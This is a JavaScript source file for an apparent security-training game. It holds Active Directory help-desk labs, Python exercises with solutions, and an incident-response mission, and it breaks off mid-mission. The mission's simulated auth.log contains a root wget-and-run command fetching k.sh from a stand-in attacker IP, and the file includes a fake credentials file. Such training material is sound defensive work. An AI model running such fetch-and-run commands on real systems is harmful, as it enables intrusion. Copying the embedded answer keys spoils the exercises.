/* ============ PACKETKILL v2 · NEW CONTENT ============ */

/* ---------- widget placement ---------- */
const OBJ_WIDGETS = { "1.3":["tls","hash"], "2.5":["phish"], "3.2":["acl"], "3.4":["recovery"], "4.1":["acl"], "5.2":["risk"], "2.1":["risk"] };

/* ---------- PowerShell / Active Directory world ---------- */
function psBaseWorld(){
  const U=(sam,name,dept,title,extra)=>Object.assign({SamAccountName:sam,Name:name,GivenName:name.split(" ")[0],Surname:name.split(" ").slice(1).join(" "),Enabled:true,LockedOut:false,Department:dept,Title:title,
    DistinguishedName:`CN=${name},OU=${dept==="IT"?"Admins":"Staff"},DC=lab,DC=local`,LastLogonDate:"11/14/2026 4:52:10 PM",PasswordLastSet:"10/02/2026 8:15:44 AM",BadLogonCount:0,ChangePasswordAtLogon:false,UserPrincipalName:sam+"@lab.local"},extra||{});
  return {
    host:"WS01", user:"lab\\matthew",
    users:[
      U("matthew","Matthew Herrman","IT","Junior Systems Administrator"),
      U("jsmith","John Smith","Logistics","Supply Technician"),
      U("mlopez","Maria Lopez","Finance","Accountant"),
      U("tbaker","Tom Baker","Engineering","Field Engineer"),
      U("kchen","Kim Chen","Engineering","Network Engineer"),
      U("rpatel","Raj Patel","HR","HR Specialist"),
      U("dwilson","Dana Wilson","Logistics","Warehouse Lead"),
      U("svc_backup","svc_backup","IT","Service account: nightly backups",{GivenName:"",Surname:""}),
      U("administrator","Administrator","IT","Built-in admin",{GivenName:"",Surname:""})
    ],
    groups:{ "Domain Admins":["administrator"], "Help Desk":["matthew"], "Staff":["jsmith","mlopez","tbaker","kchen","rpatel","dwilson"], "VPN Users":["tbaker","kchen","jsmith"], "Engineering":["tbaker","kchen"], "Backup Operators":["svc_backup"] },
    services:[
      {Name:"Dnscache",DisplayName:"DNS Client",Status:"Running",StartType:"Automatic"},
      {Name:"EventLog",DisplayName:"Windows Event Log",Status:"Running",StartType:"Automatic"},
      {Name:"LanmanServer",DisplayName:"Server",Status:"Running",StartType:"Automatic"},
      {Name:"Spooler",DisplayName:"Print Spooler",Status:"Running",StartType:"Automatic"},
      {Name:"W32Time",DisplayName:"Windows Time",Status:"Running",StartType:"Automatic"},
      {Name:"WinRM",DisplayName:"Windows Remote Management (WS-Management)",Status:"Running",StartType:"Automatic"},
      {Name:"wuauserv",DisplayName:"Windows Update",Status:"Running",StartType:"Manual"},
      {Name:"MapsBroker",DisplayName:"Downloaded Maps Manager",Status:"Stopped",StartType:"Automatic"},
      {Name:"sppsvc",DisplayName:"Software Protection",Status:"Stopped",StartType:"Automatic"},
      {Name:"Fax",DisplayName:"Fax",Status:"Stopped",StartType:"Manual"}
    ],
    processes:[
      {Name:"explorer",Id:4120,CPU:12.4,Path:"C:\\Windows\\explorer.exe",Company:"Microsoft Corporation"},
      {Name:"svchost",Id:912,CPU:3.1,Path:"C:\\Windows\\System32\\svchost.exe",Company:"Microsoft Corporation"},
      {Name:"svchost",Id:1040,CPU:1.7,Path:"C:\\Windows\\System32\\svchost.exe",Company:"Microsoft Corporation"},
      {Name:"lsass",Id:688,CPU:0.9,Path:"C:\\Windows\\System32\\lsass.exe",Company:"Microsoft Corporation"},
      {Name:"msedge",Id:7344,CPU:44.2,Path:"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",Company:"Microsoft Corporation"},
      {Name:"powershell",Id:8012,CPU:2.2,Path:"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",Company:"Microsoft Corporation"},
      {Name:"Teams",Id:6520,CPU:18.0,Path:"C:\\Users\\matthew\\AppData\\Local\\Microsoft\\Teams\\Teams.exe",Company:"Microsoft Corporation"}
    ],
    events:[
      {TimeCreated:"11/15/2026 7:02:11 AM",Id:4624,LogName:"Security",LevelDisplayName:"Information",Message:"An account was successfully logged on. Account: matthew  Source: 10.0.2.21"},
      {TimeCreated:"11/15/2026 6:58:40 AM",Id:4740,LogName:"Security",LevelDisplayName:"Information",Message:"A user account was locked out. Account: jsmith  Caller: WS07"},
      {TimeCreated:"11/15/2026 6:58:31 AM",Id:4625,LogName:"Security",LevelDisplayName:"Information",Message:"An account failed to log on. Account: jsmith  Source: 10.0.2.37"},
      {TimeCreated:"11/15/2026 6:58:22 AM",Id:4625,LogName:"Security",LevelDisplayName:"Information",Message:"An account failed to log on. Account: jsmith  Source: 10.0.2.37"},
      {TimeCreated:"11/15/2026 6:58:10 AM",Id:4625,LogName:"Security",LevelDisplayName:"Information",Message:"An account failed to log on. Account: jsmith  Source: 10.0.2.37"},
      {TimeCreated:"11/15/2026 6:41:05 AM",Id:7036,LogName:"System",LevelDisplayName:"Information",Message:"The Windows Time service entered the stopped state."}
    ],
    ports:{ "10.0.2.10":[53,88,135,389,445,636], "10.0.2.20":[22,80,443], "10.0.2.30":[3389,445], "8.8.8.8":[53,443] },
    files:{ "C:\\Users\\matthew\\Desktop\\handoff.txt":"Night shift handoff:\n- jsmith called twice, locked out again\n- Print server slow\n- Reminder: Tom Baker's last day is Friday" },
    secret:{}, log:[]
  };
}

/* ---------- PowerShell labs ---------- */
const PS_LABS = [
{ id:"ps1", n:"01", t:"FIRST CONTACT", xp:60, obj:"4.5",
  intro:"You just sat down at WS01, a domain-joined workstation in lab.local. Get your bearings the way every admin does: who am I, what machine is this, and what can this shell do.",
  tasks:[
    {id:"who",desc:"Show the account you're logged in as",hint:"whoami",check:w=>w.log.some(l=>/^whoami$/.test(l))},
    {id:"host",desc:"Show this computer's name",hint:"hostname",check:w=>w.log.some(l=>/^hostname$/.test(l))},
    {id:"cmd",desc:"List the commands this lab supports",hint:"Get-Command",check:w=>w.log.some(l=>/^(get-command|gcm)$/.test(l))},
    {id:"read",desc:"Read the handoff note on the Desktop",hint:"Get-Content C:\\Users\\matthew\\Desktop\\handoff.txt",check:w=>w.log.some(l=>/^(get-content|cat|type|gc) .*handoff\.txt/.test(l))}
  ]},
{ id:"ps2", n:"02", t:"FIND THE USER", xp:80, obj:"4.5", setup:w=>{ const u=w.users.find(u=>u.SamAccountName==="jsmith"); u.LockedOut=true; u.BadLogonCount=5; },
  intro:"The handoff note says John Smith (jsmith) keeps calling. Before you touch anything, look him up. Get-ADUser shows only a few properties by default. -Properties * shows everything.",
  tasks:[
    {id:"basic",desc:"Look up jsmith in Active Directory",hint:"Get-ADUser jsmith",check:w=>w.log.some(l=>/^get-aduser (-identity )?jsmith$/.test(l))},
    {id:"all",desc:"Look up jsmith with ALL properties",hint:"Get-ADUser jsmith -Properties *",check:w=>w.log.some(l=>/^get-aduser (-identity )?jsmith -properties \*/.test(l))},
    {id:"q",desc:"Question: why can't jsmith log in?",quiz:{q:"Based on jsmith's properties, why can't he log in?",opts:["His account is locked out","His account is disabled","His password expired","He isn't in any groups"],ans:0}}
  ]},
{ id:"ps3", n:"03", t:"LOCKED OUT MONDAY", xp:100, obj:"4.5",
  intro:"Monday morning, the phones light up. Find every locked-out account at once, then unlock them. Search-ADAccount finds them; Unlock-ADAccount fixes them.",
  setup:w=>{ ["jsmith","dwilson"].forEach(s=>w.users.find(u=>u.SamAccountName===s).LockedOut=true); },
  tasks:[
    {id:"find",desc:"List every locked-out account",hint:"Search-ADAccount -LockedOut",check:w=>w.log.some(l=>/^search-adaccount -lockedout/.test(l))},
    {id:"u1",desc:"Unlock jsmith",hint:"Unlock-ADAccount jsmith",check:w=>!w.users.find(u=>u.SamAccountName==="jsmith").LockedOut},
    {id:"u2",desc:"Unlock the other locked-out account",hint:"Look at your Search-ADAccount results, then Unlock-ADAccount <name>",check:w=>!w.users.find(u=>u.SamAccountName==="dwilson").LockedOut},
    {id:"verify",desc:"Confirm nobody is locked out now",hint:"Search-ADAccount -LockedOut (should return nothing)",check:w=>w.log.filter(l=>/^search-adaccount -lockedout/.test(l)).length>=2 && w.users.every(u=>!u.LockedOut)}
  ]},
{ id:"ps4", n:"04", t:"PASSWORD RESET", xp:100, obj:"4.5",
  intro:"Maria Lopez forgot her password. You've verified her identity over the phone (identity proofing, Sec+ 4.5). Reset it to a temporary password, then force her to change it at next logon.",
  tasks:[
    {id:"reset",desc:"Reset mlopez's password",hint:"Set-ADAccountPassword mlopez -Reset -NewPassword (ConvertTo-SecureString \"Temp#2026!\" -AsPlainText -Force)",check:w=>!!w.secret.mlopez},
    {id:"force",desc:"Make her change it at next logon",hint:"Set-ADUser mlopez -ChangePasswordAtLogon $true",check:w=>w.users.find(u=>u.SamAccountName==="mlopez").ChangePasswordAtLogon===true},
    {id:"q",desc:"Question: why force a change?",quiz:{q:"Why make the user change the temporary password at next logon?",opts:["So only she knows her password, which supports non-repudiation","Because AD requires it for every reset","To unlock the account","So the help desk can log in as her later"],ans:0}}
  ]},
{ id:"ps5", n:"05", t:"OFFBOARDING", xp:120, obj:"4.5",
  intro:"Tom Baker's last day was Friday. A stale enabled account is exactly what attackers look for (Sec+ 2.4, unmanaged/stale credentials). Disable it and strip his remote access.",
  tasks:[
    {id:"groups",desc:"See which groups tbaker belongs to",hint:"Get-ADPrincipalGroupMembership tbaker",check:w=>w.log.some(l=>/^get-adprincipalgroupmembership (-identity )?tbaker/.test(l))},
    {id:"dis",desc:"Disable tbaker's account",hint:"Disable-ADAccount tbaker",check:w=>w.users.find(u=>u.SamAccountName==="tbaker").Enabled===false},
    {id:"vpn",desc:"Remove tbaker from VPN Users",hint:"Remove-ADGroupMember \"VPN Users\" -Members tbaker -Confirm:$false",check:w=>!w.groups["VPN Users"].includes("tbaker")},
    {id:"eng",desc:"Remove tbaker from Engineering",hint:"Remove-ADGroupMember Engineering -Members tbaker -Confirm:$false",check:w=>!w.groups["Engineering"].includes("tbaker")}
  ]},
{ id:"ps6", n:"06", t:"NEW HIRE", xp:120, obj:"4.6",
  intro:"Ava Reed starts in Logistics on Monday. Create her account and give her Staff access. In Lab 2 at home you'll script this from a CSV.",
  tasks:[
    {id:"new",desc:"Create user Ava Reed with SamAccountName areed",hint:"New-ADUser -Name \"Ava Reed\" -SamAccountName areed -Department Logistics",check:w=>w.users.some(u=>u.SamAccountName==="areed")},
    {id:"grp",desc:"Add areed to Staff",hint:"Add-ADGroupMember Staff -Members areed",check:w=>w.groups["Staff"].includes("areed")},
    {id:"chk",desc:"Verify her group membership",hint:"Get-ADGroupMember Staff",check:w=>w.log.some(l=>/^get-adgroupmember (-identity )?["']?staff["']?/.test(l))}
  ]},
{ id:"ps7", n:"07", t:"WHO'S HAMMERING THE DOOR", xp:140, obj:"2.5",
  intro:"Security wants to know about failed logons this morning. Event ID 4625 is a failed logon. 4740 is a lockout. Get-WinEvent with -FilterHashtable is the fast way to pull them.",
  tasks:[
    {id:"pull",desc:"Pull failed-logon events (ID 4625) from the Security log",hint:"Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}",check:w=>w.log.some(l=>/get-winevent.*4625/.test(l))},
    {id:"lock",desc:"Pull lockout events (ID 4740)",hint:"Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4740}",check:w=>w.log.some(l=>/get-winevent.*4740/.test(l))},
    {id:"q",desc:"Question: what are you looking at?",quiz:{q:"Three failed logons for jsmith from 10.0.2.37 in 21 seconds, then a lockout. What's the most likely explanation?",opts:["A user mistyping a password, or a saved stale password on WS07","Password spraying across the domain","An impossible-travel login","A pass-the-hash attack"],ans:0}}
  ]},
{ id:"ps8", n:"08", t:"SERVICE DOWN", xp:120, obj:"4.4",
  intro:"Users report the clock on their machines is drifting, and Kerberos breaks when clocks drift. Find Automatic services that aren't running, the same check your HealthCheck.ps1 does, and fix the real problem.",
  setup:w=>{ const s=w.services.find(x=>x.Name==="W32Time"); s.Status="Stopped"; },
  tasks:[
    {id:"find",desc:"List Automatic services that are stopped",hint:"Get-Service | Where-Object {$_.StartType -eq 'Automatic' -and $_.Status -eq 'Stopped'}",check:w=>w.log.some(l=>/get-service.*where-object.*automatic/.test(l)||/get-service.*\?.*automatic/.test(l))},
    {id:"start",desc:"Start the service that's actually broken",hint:"Start-Service W32Time",check:w=>w.services.find(x=>x.Name==="W32Time").Status==="Running"},
    {id:"q",desc:"Question: the other two stopped services",quiz:{q:"MapsBroker and sppsvc also show as Automatic and Stopped. What should you do?",opts:["Nothing. They start on demand or on a trigger, then stop again","Start them both immediately","Disable them","Reboot the server"],ans:0}}
  ]},
{ id:"ps9", n:"09", t:"PORT CHECK", xp:100, obj:"3.2",
  intro:"Someone says RDP to the file server (10.0.2.30) works but HTTPS doesn't. Test it instead of guessing. Test-NetConnection with -Port tells you whether a TCP port answers.",
  tasks:[
    {id:"rdp",desc:"Test port 3389 on 10.0.2.30",hint:"Test-NetConnection 10.0.2.30 -Port 3389",check:w=>w.log.some(l=>/^(test-netconnection|tnc) (-computername )?10\.0\.2\.30 -port 3389/.test(l))},
    {id:"https",desc:"Test port 443 on 10.0.2.30",hint:"Test-NetConnection 10.0.2.30 -Port 443",check:w=>w.log.some(l=>/^(test-netconnection|tnc) (-computername )?10\.0\.2\.30 -port 443/.test(l))},
    {id:"q",desc:"Question: what did you prove?",quiz:{q:"3389 succeeded and 443 failed on the file server. What's true?",opts:["The host is up, but nothing answers on 443, so it's a service or firewall issue, not the network","The server is down","DNS is broken","The client's network cable is bad"],ans:0}}
  ]},
{ id:"ps10", n:"10", t:"ROGUE PROCESS", xp:160, obj:"2.5",
  intro:"Your EDR flagged WS01 for odd outbound traffic. List processes and look for something pretending to be Windows. Hint: real svchost.exe only runs from C:\\Windows\\System32.",
  setup:w=>{ w.processes.push({Name:"svch0st",Id:6666,CPU:61.3,Path:"C:\\Users\\matthew\\AppData\\Local\\Temp\\svch0st.exe",Company:""}); },
  tasks:[
    {id:"list",desc:"List running processes",hint:"Get-Process",check:w=>w.log.some(l=>/^(get-process|gps|ps)( |$)/.test(l))},
    {id:"path",desc:"Show the suspicious process's file path",hint:"Get-Process svch0st | Select-Object Name,Id,Path",check:w=>w.log.some(l=>/svch0st.*select-object.*path|svch0st.*format-list|svch0st.*fl/.test(l))},
    {id:"kill",desc:"Stop it",hint:"Stop-Process -Name svch0st -Force",check:w=>!w.processes.some(p=>p.Name==="svch0st")},
    {id:"q",desc:"Question: name the indicators",quiz:{q:"Which TWO indicators made svch0st suspicious?",opts:["A look-alike name (zero instead of o) and running from a Temp folder","High CPU and a Microsoft signature","It runs as SYSTEM and uses port 443","It was started by explorer.exe"],ans:0}}
  ]}
];

/* ---------- Python exercises (real Python, hidden tests) ---------- */
const PY_EX = [
{ id:"py1", t:"Hello, operator", xp:40, brief:"Print exactly: PACKETKILL ONLINE",
  starter:"# print a line of text\n", out:"PACKETKILL ONLINE", tests:[], hint:"print(\"...\") with the exact text.",
  solution:'print("PACKETKILL ONLINE")' },
{ id:"py2", t:"Variables + f-strings", xp:50, brief:"Make variables service = \"SSH\" and port = 22, then print exactly: SSH runs on port 22",
  starter:"service = \nport = \n", out:"SSH runs on port 22", tests:[["service is 'SSH'","service == 'SSH'"],["port is the number 22","port == 22 and isinstance(port, int)"]], hint:"print(f\"{service} runs on port {port}\")",
  solution:'service = "SSH"\nport = 22\nprint(f"{service} runs on port {port}")' },
{ id:"py3", t:"Well-known port lookup", xp:60, brief:"Write port_name(p) that returns the service name for 22, 53, 443 and 3389 (SSH, DNS, HTTPS, RDP) and \"UNKNOWN\" for anything else. Use a dictionary.",
  starter:"def port_name(p):\n    ports = {}\n    return ...\n", tests:[["port_name(22) == 'SSH'","port_name(22)=='SSH'"],["port_name(3389) == 'RDP'","port_name(3389)=='RDP'"],["port_name(53) == 'DNS'","port_name(53)=='DNS'"],["port_name(9999) == 'UNKNOWN'","port_name(9999)=='UNKNOWN'"]], hint:"ports.get(p, \"UNKNOWN\") returns a default when the key is missing.",
  solution:'def port_name(p):\n    ports = {22:"SSH", 53:"DNS", 443:"HTTPS", 3389:"RDP"}\n    return ports.get(p, "UNKNOWN")' },
{ id:"py4", t:"Private or public?", xp:80, brief:"Write is_private(ip) that returns True for RFC 1918 addresses (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) and False otherwise. Don't import ipaddress. Split the string.",
  starter:"def is_private(ip):\n    a, b, c, d = [int(x) for x in ip.split('.')]\n    # your checks here\n", tests:[["10.1.2.3 is private","is_private('10.1.2.3') is True"],["172.16.0.1 is private","is_private('172.16.0.1') is True"],["172.31.255.9 is private","is_private('172.31.255.9') is True"],["172.32.0.1 is public","is_private('172.32.0.1') is False"],["192.168.1.50 is private","is_private('192.168.1.50') is True"],["8.8.8.8 is public","is_private('8.8.8.8') is False"]], hint:"172.16 to 172.31 means a == 172 and 16 <= b <= 31.",
  solution:"def is_private(ip):\n    a, b, c, d = [int(x) for x in ip.split('.')]\n    return a == 10 or (a == 172 and 16 <= b <= 31) or (a == 192 and b == 168)" },
{ id:"py5", t:"Subnet math", xp:80, brief:"Write usable_hosts(prefix) that returns the number of usable host addresses for a CIDR prefix like 24 or 26. Assume prefixes 1 to 30.",
  starter:"def usable_hosts(prefix):\n    return ...\n", tests:[["/24 has 254 hosts","usable_hosts(24)==254"],["/26 has 62 hosts","usable_hosts(26)==62"],["/30 has 2 hosts","usable_hosts(30)==2"],["/16 has 65534 hosts","usable_hosts(16)==65534"]], hint:"Host bits = 32 - prefix. Usable = 2 to the power of host bits, minus 2.",
  solution:"def usable_hosts(prefix):\n    return 2 ** (32 - prefix) - 2" },
{ id:"py6", t:"Count the failures", xp:90, brief:"Write count_failed(lines) that returns how many lines contain \"Failed password\". lines is a list of strings from auth.log.",
  starter:"def count_failed(lines):\n    count = 0\n    # loop over lines\n    return count\n", tests:[["two failures","count_failed(['Failed password for root','Accepted password for kim','Failed password for admin'])==2"],["empty list","count_failed([])==0"],["case matters","count_failed(['failed password for x'])==0"]], hint:"if \"Failed password\" in line: count += 1",
  solution:"def count_failed(lines):\n    count = 0\n    for line in lines:\n        if 'Failed password' in line:\n            count += 1\n    return count" },
{ id:"py7", t:"Top attacker", xp:120, brief:"Write top_ip(lines) that returns the IP with the most \"Failed password\" lines. Each line ends with: from <ip> port <n> ssh2",
  starter:"def top_ip(lines):\n    counts = {}\n    # for each failed line, grab the IP after 'from'\n    return ...\n", tests:[["finds the busiest IP","top_ip(['Failed password for root from 1.2.3.4 port 1 ssh2','Failed password for a from 5.6.7.8 port 2 ssh2','Failed password for b from 1.2.3.4 port 3 ssh2'])=='1.2.3.4'"],["ignores successful logins","top_ip(['Accepted password for x from 9.9.9.9 port 1 ssh2','Accepted password for y from 9.9.9.9 port 1 ssh2','Failed password for z from 7.7.7.7 port 1 ssh2'])=='7.7.7.7'"]], hint:"parts = line.split(); ip = parts[parts.index('from') + 1]. Then max(counts, key=counts.get).",
  solution:"def top_ip(lines):\n    counts = {}\n    for line in lines:\n        if 'Failed password' not in line:\n            continue\n        parts = line.split()\n        ip = parts[parts.index('from') + 1]\n        counts[ip] = counts.get(ip, 0) + 1\n    return max(counts, key=counts.get)" },
{ id:"py8", t:"Annualized loss", xp:80, brief:"Sec+ 5.2 in code. Write ale(asset_value, exposure_factor, aro) that returns the annualized loss expectancy. SLE = asset_value × exposure_factor, and ALE = SLE × ARO. Round to 2 decimals.",
  starter:"def ale(asset_value, exposure_factor, aro):\n    sle = \n    return \n", tests:[["$50,000 × 0.2 × 0.5 = 5000","ale(50000, 0.2, 0.5)==5000"],["$12,000 × 0.25 × 3 = 9000","ale(12000, 0.25, 3)==9000"],["rounds to cents","ale(1000, 0.333, 1)==333.0"]], hint:"return round(sle * aro, 2)",
  solution:"def ale(asset_value, exposure_factor, aro):\n    sle = asset_value * exposure_factor\n    return round(sle * aro, 2)" },
{ id:"py9", t:"Password checker", xp:110, brief:"Write strength(pw) that returns \"weak\" if it's under 12 characters, \"strong\" if it's 12+ AND has a digit AND a symbol (not a letter or digit), and \"ok\" otherwise.",
  starter:"def strength(pw):\n    has_digit = any(ch.isdigit() for ch in pw)\n    has_symbol = \n    ...\n", tests:[["short is weak","strength('P@ss1')=='weak'"],["long with digit and symbol is strong","strength('Concrete#Finisher2026')=='strong'"],["long with no symbol is ok","strength('concretefinisher2026')=='ok'"],["exactly 12 counts","strength('abcdefghij1!')=='strong'"]], hint:"has_symbol = any(not ch.isalnum() for ch in pw)",
  solution:"def strength(pw):\n    has_digit = any(ch.isdigit() for ch in pw)\n    has_symbol = any(not ch.isalnum() for ch in pw)\n    if len(pw) < 12:\n        return 'weak'\n    if has_digit and has_symbol:\n        return 'strong'\n    return 'ok'" },
{ id:"py10", t:"Salted hashes", xp:120, brief:"Sec+ 1.3 in code. Write hash_pw(pw, salt) that returns the SHA-256 hex digest of salt + pw. Then notice that the same password with two salts gives two different hashes.",
  starter:"import hashlib\n\ndef hash_pw(pw, salt):\n    return \n", tests:[["matches SHA-256 of salt+pw","hash_pw('Winter2026!','a1b2')==__import__('hashlib').sha256(b'a1b2Winter2026!').hexdigest()"],["different salts, different hashes","hash_pw('x','s1')!=hash_pw('x','s2')"],["64 hex characters","len(hash_pw('x','y'))==64"]], hint:"hashlib.sha256((salt + pw).encode()).hexdigest()",
  solution:"import hashlib\n\ndef hash_pw(pw, salt):\n    return hashlib.sha256((salt + pw).encode()).hexdigest()" }
];

/* ---------- Story missions ---------- */
function ironGateFS(){
  const ts=(m,s)=>`Nov 15 02:${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}`;
  const L=[];
  const users=["admin","oracle","test","ubuntu","guest","ftpuser","postgres","deploy"];
  let port=40000;
  for (let i=0;i<34;i++) L.push(`${ts(3+Math.floor(i/3), (i*7)%60)} web01 sshd[${2100+i}]: Failed password for invalid user ${users[i%users.length]} from 203.0.113.45 port ${port+=3} ssh2`);
  for (let i=0;i<9;i++) L.push(`${ts(16+i, (i*11)%60)} web01 sshd[${2200+i}]: Failed password for invalid user ${users[(i+3)%users.length]} from 198.51.100.7 port ${port+=5} ssh2`);
  for (let i=0;i<4;i++) L.push(`${ts(26+i, (i*13)%60)} web01 sshd[${2300+i}]: Failed password for invalid user ${users[(i+5)%users.length]} from 192.0.2.10 port ${port+=7} ssh2`);
  L.push(`${ts(31,2)} web01 sshd[2391]: Accepted password for svc_backup from 203.0.113.45 port 51877 ssh2`);
  L.push(`${ts(31,2)} web01 sshd[2391]: pam_unix(sshd:session): session opened for user svc_backup by (uid=0)`);
  L.push(`${ts(33,40)} web01 sudo: svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.45/k.sh -O /tmp/k.sh`);
  L.push(`${ts(34,5)} web01 sudo: svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/bin/bash /tmp/k.sh`);
  L.push(`${ts(48,51)} web01 sshd[2391]: pam_unix(sshd:session): session closed for user svc_backup`);
  L.push(`Nov 15 06:12:44 web01 sshd[2502]: Accepted publickey for kchen from 10.0.2.21 port 55102 ssh2`);
  return { type:"dir", name:"/", children:{
    home:{type:"dir",children:{ matt:{type:"dir",children:{ "NOTES.txt":{type:"file",content:"IRON GATE notes\n- web01 is the public web server\n- logs live in /var/log\n- svc_backup should ONLY run the nightly backup job, never interactive logins\n"} }}, svc_backup:{type:"dir",children:{ ".bash_history":{type:"file",content:"cd /tmp\nls -la\ncat /etc/backup/creds.conf\nexit\n"} }} }},
    var:{type:"dir",children:{ log:{type:"dir",children:{ "auth.log":{type:"file",content:L.join("\n")+"\n"}, "syslog":{type:"file",content:"Nov 15 02:34:06 web01 kernel: [ 9811.2] k.sh: outbound connection to 10.0.2.10:389\nNov 15 02:34:07 web01 kernel: [ 9811.9] k.sh: outbound connection to 10.0.2.10:636\n"} }} }},
    tmp:{type:"dir",children:{ "k.sh":{type:"file",content:"#!/bin/bash\n# pulls creds from backup config and talks to the DC over LDAP\nCREDS=$(cat /etc/backup/creds.conf)\n# ... uses svc_backup domain creds to modify AD ...\n"} }},
    etc:{type:"dir",children:{ backup:{type:"dir",children:{ "creds.conf":{type:"file",content:"# backup job credentials\ndomain_user=LAB\\\\svc_backup\ndomain_pass=Backup2019!\n"} }} }}
  }};
}
function ironGateWorld(w){
  const sb=w.users.find(u=>u.SamAccountName==="svc_backup"); sb.LastLogonDate="11/15/2026 2:36:12 AM"; sb.PasswordLastSet="03/11/2019 9:02:31 AM";
  w.groups["Domain Admins"].push("svc_backup");
  w.users.push(Object.assign({}, w.users.find(u=>u.SamAccountName==="jsmith"), {SamAccountName:"helpdesk2",Name:"helpdesk2",GivenName:"",Surname:"",Department:"IT",Title:"",DistinguishedName:"CN=helpdesk2,CN=Users,DC=lab,DC=local",LastLogonDate:"11/15/2026 2:52:40 AM",PasswordLastSet:"11/15/2026 2:51:03 AM",UserPrincipalName:"helpdesk2@lab.local"}));
  w.groups["Domain Admins"].push("helpdesk2");
  w.host="DC01";
  w.events.unshift(
    {TimeCreated:"11/15/2026 2:51:30 AM",Id:4728,LogName:"Security",LevelDisplayName:"Information",Message:"A member was added to a security-enabled global group. Member: helpdesk2  Group: Domain Admins  By: svc_backup"},
    {TimeCreated:"11/15/2026 2:51:03 AM",Id:4720,LogName:"Security",LevelDisplayName:"Information",Message:"A user account was created. New account: helpdesk2  Created by: svc_backup  Source: 10.0.2.20"},
    {TimeCreated:"11/15/2026 2:36:40 AM",Id:4728,LogName:"Security",LevelDisplayName:"Information",Message:"A member was added to a security-enabled global group. Member: svc_backup  Group: Domain Admins  By: svc_backup"},
    {TimeCreated:"11/15/2026 2:36:12 AM",Id:4624,LogName:"Security",LevelDisplayName:"Information",Message:"An account was successfully logged on. Account: svc_backup  Source: 10.0.2.20 (web01)"}
  );
}
const MISSIONS_V2 = [
{ id:"irongate", code:"OP-01", title:"OPERATION IRON GATE", tag:"Incident response · Sec+ 2.5, 4.7, 4.8", xp:600,
  premise:"You're three weeks into a junior sysadmin job at a contractor supporting Fort Granite. It's 06:40 Monday. The overnight NOC note says web01, the public web server, saw a spike in SSH traffic around 2 AM. Your lead is out. You have the keys.",
  stages:[
    { id:"s1", title:"WHAT HIT US", env:"bash", fs:ironGateFS, host:"web01",
      brief:"You're on web01. SSH logins are logged in /var/log/auth.log. Start by measuring the noise: how many failed password attempts were logged?",
      tasks:[{type:"answer", q:"How many \"Failed password\" lines are in /var/log/auth.log?", accept:["47"], hint:"grep -c \"Failed password\" /var/log/auth.log"}]},
    { id:"s2", title:"FIND THE SOURCE", env:"bash", fs:ironGateFS, host:"web01",
      brief:"47 failures is an attack, not a typo. Figure out who's doing the most knocking. In these lines the source IP is the 13th field.",
      tasks:[{type:"answer", q:"Which IP address made the most failed attempts?", accept:["203.0.113.45"], hint:"grep \"Failed password\" /var/log/auth.log | awk '{print $13}' | sort | uniq -c | sort -nr | head -3"}]},
    { id:"s3", title:"DID THEY GET IN", env:"bash", fs:ironGateFS, host:"web01",
      brief:"Brute force usually fails. Usually. Look for a successful login from the same address.",
      tasks:[{type:"answer", q:"Which account did 203.0.113.45 successfully log in as?", accept:["svc_backup"], hint:"grep \"Accepted\" /var/log/auth.log"},
             {type:"answer", q:"What file did they download and run as root? (just the file name)", accept:["k.sh","/tmp/k.sh"], hint:"grep \"COMMAND\" /var/log/auth.log"}]},
    { id:"s4", title:"FOLLOW THE CREDS", env:"bash", fs:ironGateFS, host:"web01",
      brief:"svc_backup is a service account. It should never log in interactively. Read the script they ran and find out what it was after.",
      tasks:[{type:"answer", q:"The script reads a credentials file. What's the full path of that file?", accept:["/etc/backup/creds.conf"], hint:"cat /tmp/k.sh"},
             {type:"answer", q:"What year was the backup password apparently set? (look at the password itself)", accept:["2019"], hint:"cat /etc/backup/creds.conf"},
             {type:"answer", q:"Which server did k.sh reach out to over LDAP? (IP address)", accept:["10.0.2.10"], hint:"cat /var/log/syslog"}]},
    { id:"s5", title:"ON THE DOMAIN CONTROLLER", env:"ps", world:ironGateWorld, host:"DC01",
      brief:"10.0.2.10 is DC01, your domain controller. You're on it now in PowerShell. Those were domain credentials. Check what svc_backup can do now, and look for accounts created overnight (event ID 4720).",
      tasks:[{type:"answer", q:"What privileged group is svc_backup now a member of?", accept:["domain admins"], hint:"Get-ADPrincipalGroupMembership svc_backup"},
             {type:"answer", q:"The attacker created a backdoor account. What's its name?", accept:["helpdesk2"], hint:"Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720}"}]},
    { id:"s6", title:"CONTAIN IT", env:"ps", world:ironGateWorld, host:"DC01",
      brief:"Containment time (Sec+ 4.7). Shut the doors without destroying evidence: disable the backdoor and the compromised service account, and pull both out of Domain Admins. Disable, don't delete. Deleting destroys evidence.",
      tasks:[{type:"state", desc:"Disable helpdesk2", hint:"Disable-ADAccount helpdesk2", check:w=>w.users.find(u=>u.SamAccountName==="helpdesk2").Enabled===false},
             {type:"state", desc:"Disable svc_backup", hint:"Disable-ADAccount svc_backup", check:w=>w.users.find(u=>u.SamAccountName==="svc_backup").Enabled===false},
             {type:"state", desc:"Remove helpdesk2 from Domain Admins", hint:"Remove-ADGroupMember \"Domain Admins\" -Members helpdesk2 -Confirm:$false", check:w=>!w.groups["Domain Admins"].includes("helpdesk2")},
             {type:"state", desc:"Remove svc_backup from Domain Admins", hint:"Remove-ADGroupMember \"Domain Admins\" -Members svc_backup -Confirm:$false", check:w=>!w.groups["Domain Admins"].includes("svc_backup")},
             {type:"state", desc:"Keep both accounts in AD as evidence (don't delete them)", hint:"Don't run Remove-ADUser", check:w=>w.users.some(u=>u.SamAccountName==="helpdesk2")&&w.users.some(u=>u.SamAccountName==="svc_backup")}]},
    { id:"s7", title:"DEBRIEF", env:"none",
      brief:"Containment holds. Now write it up the way your lead will want it.",
      tasks:[{type:"choice", q:"Which items are indicators of compromise from this incident? Pick the best set.", opts:["203.0.113.45, /tmp/k.sh, the helpdesk2 account, and svc_backup's 2:31 AM interactive login","The 9 failures from 198.51.100.7 only","kchen's 06:12 publickey login","The Windows Time service stopping"], ans:0},
